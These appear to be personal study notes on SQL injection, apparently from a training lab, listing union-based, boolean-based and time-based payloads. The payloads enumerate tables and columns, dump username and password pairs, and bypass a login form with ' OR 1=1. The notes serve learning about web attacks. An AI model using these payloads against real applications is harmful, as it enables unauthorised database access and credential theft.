# Learning SQL Injection

Just taking some notes about different SQL Injections.

#### This will display the tables
```
id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = database()--
```
#### This will display the columns from the selected table
```
id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'--
```
#### This will display the username and password
```
id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM users

Ex.
admin:p4ssword
martin:pa$$word
jim:work123
```
#### This will bypass the login form and will return true to the server
```
' OR 1=1;--

Ex.
username: ' OR 1=1;--
password: ' OR 1=1;--
```
# Boolean Based
#### This will guess for the correct database base on the first letter
```
' UNION SELECT 1,2,3 where database() like 'a%';--
' UNION SELECT 1,2,3 where database() like 'h%';--
```
#### This will guess for the correct table in the database
```
' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'h%';--

> The sqli_three is the example database
```
#### This will guess for the correct column in the table and in database
```
' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

> The sqli_three is the example database
> The users is the example table 
```
#### This will guess for the row or data in username column
```
' UNION SELECT 1,2,3 from users where username like 'a%
```
#### This will guess for the row or data in password column
```
' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```
# Time Based
#### This will guess for the correct username and password in users table
```
' UNION SELECT SLEEP(2),2 from users where username like 'ad%in' and password like '49%1';--
```
